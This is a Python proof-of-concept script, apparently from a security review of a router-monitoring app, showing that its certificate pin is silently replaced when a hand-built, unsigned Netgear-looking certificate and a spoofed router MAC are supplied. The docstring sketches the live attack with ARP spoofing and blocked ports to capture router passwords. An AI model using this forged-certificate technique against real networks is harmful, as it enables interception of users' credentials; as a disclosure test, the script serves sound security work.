#!/usr/bin/env python3
"""PoC 2 — router certificate pin silently replaced by a LAN impersonator (CWE-295, High).

Vulnerable code:
  routercert.py:96-117    "looks_like_router_cert" checks only subject/issuer strings;
                          no signature or chain verification
  monitor.py:271-288      one failed TCP probe sets _router_dropped
  monitor.py:722-766      _trust_unasked_restart() replaces the pin when the cert merely looks
                          Netgear-ish and the OS ARP table reports the previously known MAC

This calls the real application code with attacker-controlled inputs (a forged Netgear-looking
certificate and a spoofed MAC). No network, root, or real router is needed.

A real LAN attack supplies the same two inputs: ARP replies using the router's MAC make the
host appear to be the same hardware, and briefly blocking its TCP 443/80 sets _router_dropped.
"""
import argparse
import datetime
import hashlib
import sys
import tempfile
import time
from pathlib import Path

from poc_common import orbi_arg, load_orbi

ROUTER = "192.168.1.1"
ROUTER_MAC = "C8:9E:43:00:00:01"
REAL_PIN = "67" * 32


def tlv(tag, value):
    n = len(value)
    head = bytes([n]) if n < 0x80 else bytes([0x80 | ((n.bit_length() + 7) // 8)]) + n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([tag]) + head + value


def name(**attrs):
    oids = {"CN": b"\x55\x04\x03", "O": b"\x55\x04\x0a"}
    return tlv(0x30, b"".join(tlv(0x31, tlv(0x30, tlv(0x06, oids[k]) + tlv(0x0C, v.encode()))) for k, v in attrs.items()))


def forged_certificate():
    """A certificate with no valid signature; only the strings the app checks are real."""
    now = datetime.datetime.now(datetime.timezone.utc).strftime("%y%m%d%H%M%SZ")
    alg = tlv(0x30, tlv(0x06, b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x0b") + b"\x05\x00")
    tbs = (tlv(0x30, tlv(0xA0, tlv(0x02, b"\x02")) + tlv(0x02, b"\x01") + alg
               + name(CN="routerlogin.net")
               + tlv(0x30, tlv(0x17, now.encode()) + tlv(0x17, b"361005204735Z"))
               + name(O="NetgearFieldDevices", CN="routerlogin.net") + tlv(0x30, b"")))
    return tlv(0x30, tbs + alg + tlv(0x03, b"\x00" + b"S" * 200))


def main():
    ap = argparse.ArgumentParser()
    orbi_arg(ap)
    args = ap.parse_args()
    load_orbi(args)

    from orbi import config, monitor as monitor_mod, routercert
    from orbi.monitor import Monitor
    from orbi.store import Store

    tmp = Path(tempfile.mkdtemp(prefix="orbi-poc2-"))
    config.DATA_DIR = tmp
    config.SETTINGS_FILE = tmp / "settings.json"
    config.save({"router_host": ROUTER, "router_cert_pins": {ROUTER: REAL_PIN}})

    evil_der = forged_certificate()
    evil_fp = hashlib.sha256(evil_der).hexdigest()
    info = routercert.describe(evil_der)
    print(f"[*] forged cert subject : {info['subject']}")
    print(f"[*] forged cert issuer  : {info['issuer']}")
    print(f"[*] looks_like_router_cert() -> {routercert.looks_like_router_cert(info)} (no signature check)")
    print(f"[*] forged fp {evil_fp[:16]}... replaces pinned {REAL_PIN[:16]}...")

    routercert.presented_der = lambda host, port=443, timeout=10: evil_der
    routercert.presented = lambda host, port=443, timeout=10: evil_fp
    routercert.gateway_mac = lambda host: ROUTER_MAC

    notes = []
    m = Monitor(Store(tmp / "orbi.db"), notify=lambda t, msg: notes.append((t, msg)), router_factory=lambda: None)
    m.state["last_scan"] = time.time() - 60
    m._router_dropped = True
    m.store.put("gateway_mac", ROUTER_MAC)

    m._cert_alert(str(routercert.CertificateChanged(ROUTER)))

    new_pin = config.load()["router_cert_pins"][ROUTER]
    print(f"[+] pin after auto-retrust: {new_pin[:16]}...")
    print(f"[+] notification: {notes[0][0] if notes else '(none)'} — trusted before user confirmation")
    assert new_pin == evil_fp and new_pin != REAL_PIN, "pin was not replaced by the forged cert"
    print("[+] CONFIRMED: forged cert accepted; the next password-bearing request goes to the attacker")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
